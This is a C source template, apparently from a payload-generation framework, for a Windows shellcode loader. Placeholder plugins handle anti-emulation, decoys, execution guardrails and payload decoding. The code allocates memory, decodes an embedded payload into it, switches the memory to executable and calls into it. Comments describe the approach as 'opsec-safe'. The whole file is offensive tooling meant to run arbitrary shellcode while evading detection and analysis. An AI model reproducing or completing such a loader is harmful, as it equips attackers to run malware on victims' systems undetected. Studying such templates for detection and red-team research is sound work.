#include <Windows.h>

#include <time.h>

char *supermega_payload;

#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40


{{plugin_antiemulation}}

{{plugin_decoy}}

{{plugin_executionguardrail}}

{{plugin_virtualprotect}}

/* VirtualAlloc -> rw -> rx

   * create new memory region for the payload
   * will set it to RX (may break some shellcodes, opsec-safe)
*/

int main()
{
	DWORD result;

	// Call: Execution Guardrail
	if (executionguardrail() != 0) {
		return 1;
	}

	// Call: Anti Emulation plugin
	antiemulation();

	// Call: Decoy plugin
	decoy();

	// Allocate 1
    // char *dest = ...
    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, p_RW);

	// Wait a bit
    //Sleep(2000);

	// Copy (and decode)
	// from: supermega_payload[]
	// to:   dest[]
{{ plugin_decoder }}

	if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
		return 7;
	}

    // Execute *dest
    (*(void(*)())(dest))();

	return 0;
}

